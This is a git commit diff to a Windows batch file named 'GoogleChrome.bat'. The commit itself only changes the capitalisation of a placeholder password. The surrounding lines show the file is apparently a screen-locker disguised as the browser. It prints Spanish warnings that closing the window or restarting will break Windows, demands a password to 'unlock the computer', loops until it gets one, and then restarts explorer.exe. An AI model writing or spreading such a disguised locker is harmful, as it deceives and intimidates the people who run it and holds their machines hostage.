13c92c9f29bdd5f8afef04bc897758b43f5c3072
DumuziT <71425551+DumuziT@users.noreply.github.com>
2022-05-31 23:07:36 -0400

    Update GoogleChrome.bat

--- GoogleChrome.bat
+++ GoogleChrome.bat
@@ -10,7 +10,7 @@ echo Si usted cierra esta ventana,  no podra colocar la contrasena.
 echo Si apaga/reinicia el computador, su "Windows" no iniciara correctamente.
 echo =============================================================================
 set /p pass=Coloque la contrasena para desbloquear el computador: 
-if %pass%==[contasena que usted quiera] (goto passcorrect) ELSE (goto bucle)
+if %pass%==[Contasena que usted quiera] (goto passcorrect) ELSE (goto bucle)
 :passcorrect
 echo Felicidades!
 start explorer.exe
